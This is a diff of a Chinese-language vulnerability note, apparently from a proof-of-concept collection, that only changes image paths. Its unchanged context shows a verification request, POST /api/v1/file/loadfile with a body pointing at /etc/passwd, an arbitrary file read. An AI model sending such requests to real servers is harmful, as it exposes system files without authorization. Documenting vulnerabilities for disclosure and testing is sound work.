@@ -20,11 +20,11 @@
 
 登陆页面
 
-![image-20230828162515540](images/image-20230828162515540.png)
+![image-20230828162515540](../.gitbook/assets/image-20230828162515540.png)
 
-![image-20230828162528792](images/image-20230828162528792.png)
+![image-20230828162528792](../.gitbook/assets/image-20230828162528792.png)
 
-![image-20230828162539743](images/image-20230828162539743.png)
+![image-20230828162539743](../.gitbook/assets/image-20230828162539743.png)
 
 验证POC
 
@@ -34,4 +34,4 @@ POST /api/v1/file/loadfile
 {"paht":"/etc/passwd"}
 ```
 
-![image-20230828162553584](images/image-20230828162553584.png)
+![image-20230828162553584](../.gitbook/assets/image-20230828162553584.png)
